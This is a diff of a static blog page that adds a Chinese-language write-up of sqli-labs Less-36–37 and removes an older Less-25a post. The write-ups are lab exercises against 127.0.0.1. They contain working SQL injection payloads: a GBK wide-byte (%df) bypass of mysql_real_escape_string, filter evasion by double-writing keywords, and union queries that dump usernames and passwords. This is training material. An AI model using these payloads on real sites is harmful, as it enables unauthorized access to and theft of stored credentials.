@@ -64,6 +64,57 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-36-37" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/21/sql-labs-Less-36-37/" class="article-date">
+  <time datetime="2021-02-21T03:32:27.000Z" itemprop="datePublished">2021-02-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/21/sql-labs-Less-36-37/">sql-labs-Less-36~37</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>Less-36</h1>
+进入http://127.0.0.1/sql/Less-36/，查看源代码：
+
+<p><img src alt="1"><br>上面的check_quotes()函数是利用了mysql_real_escape_string()函数进行的过滤(受影响的字符：\x00、\n、\r、\、’、”、\x1a)<br>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。<br>但是因mysql我们并没有设置成gbk，所以mysql_real_escape_string()依旧能够被突破。方法和前几关是一样的。<br>输入?id=1,正常输出，再输入%df’，报错，再输入–+，正常。说明是用’注入。<br>查列数：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-36/?id=1%EF%BF%BD&#39;">http://127.0.0.1/sql/Less-36/?id=1%df&#39;</a> order by 3–+<br>测位置：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-36/?id=1%EF%BF%BD&#39;union">http://127.0.0.1/sql/Less-36/?id=1%df&#39;union</a> select 1,2,3–+<br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-36/?id=1%EF%BF%BD&#39;union">http://127.0.0.1/sql/Less-36/?id=1%df&#39;union</a> select 1,database(),3–+<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-36/?id=331%EF%BF%BD&#39;">http://127.0.0.1/sql/Less-36/?id=331%df&#39;</a> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),3–+<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-36/?id=331%EF%BF%BD&#39;">http://127.0.0.1/sql/Less-36/?id=331%df&#39;</a> union select 1,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),3–+<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-36/?id=331%EF%BF%BD&#39;">http://127.0.0.1/sql/Less-36/?id=331%df&#39;</a> union select 1,(select group_concat(username) from users),(select group_concat(password) from users)–+<br>也可以用’的utf-16进行注入（�’）</p>
+<h1>Less-37</h1>
+这关也利用了mysql_real_escape_string()函数进行过滤。
+和Less-34差不多，%df在http header live里注入，�'在原页面注入。
+
+
+<h1>小结</h1>
+mysql_real_escape_string()函数详细：https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/21/sql-labs-Less-36-37/" data-id="ckleuu1a80000usux6w6s44ac" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-34" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/20/sql-labs-Less-34/" class="article-date">
@@ -448,43 +499,6 @@ https://www.cnblogs.com/lcamry/p/5762961.html
 
 
   
-    <article id="post-sql-labs-Less-25a" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/16/sql-labs-Less-25a/" class="article-date">
-  <time datetime="2021-02-16T06:03:16.000Z" itemprop="datePublished">2021-02-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/16/sql-labs-Less-25a/">sql-labs-Less-25a</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/%EF%BC%8C%E8%BE%93%E5%85%A5?id=1,%E6%AD%A3%E5%B8%B8%EF%BC%8C%E5%9C%A8%E8%BE%93%E5%85%A5&#39;%EF%BC%8C%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%EF%BC%8C%E4%BD%86%E6%B2%A1%E6%9C%89%E6%8A%A5%E9%94%99%EF%BC%8C%E8%AF%B4%E6%98%8E%E4%B8%8D%E8%83%BD%E7%94%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E3%80%82">http://127.0.0.1/sql/Less-25a/，输入?id=1,正常，在输入&#39;，出现错误，但没有报错，说明不能用报错注入。</a><br>查看源代码得知这关没有对id进行包裹，所以是整数型注入，还把大小写的‘or’和‘and’进行了过滤。<br>可以用联合注入和延时注入。<br>这里用联合注入：<br>查列数：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=1">http://127.0.0.1/sql/Less-25a/?id=1</a> oorrder by 3–+<br>测位置：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=-1">http://127.0.0.1/sql/Less-25a/?id=-1</a> union select 1,2,3–+<br>查库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=-1">http://127.0.0.1/sql/Less-25a/?id=-1</a> union select 1,database(),3–+<br>查表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=-1">http://127.0.0.1/sql/Less-25a/?id=-1</a> union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3–+<br>查列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=-1">http://127.0.0.1/sql/Less-25a/?id=-1</a> union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’),3–+<br>查字段：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=-1">http://127.0.0.1/sql/Less-25a/?id=-1</a> union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)–+</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/16/sql-labs-Less-25a/" data-id="ckl7qekm800006cux4z216qc2" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -521,6 +535,10 @@ https://www.cnblogs.com/lcamry/p/5762961.html
       <ul>
         
           <li>
+            <a href="/2021/02/21/sql-labs-Less-36-37/">sql-labs-Less-36~37</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/20/sql-labs-Less-34/">sql-labs-Less-34</a>
           </li>
         
@@ -534,10 +552,6 @@ https://www.cnblogs.com/lcamry/p/5762961.html
         
           <li>
             <a href="/2021/02/18/sql-labs-Less-29-31/">sql-labs-Less-29~31</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/17/sql-labs-Less-28-28a/">sql-labs-Less-28-28a</a>
           </li>
         
       </ul>
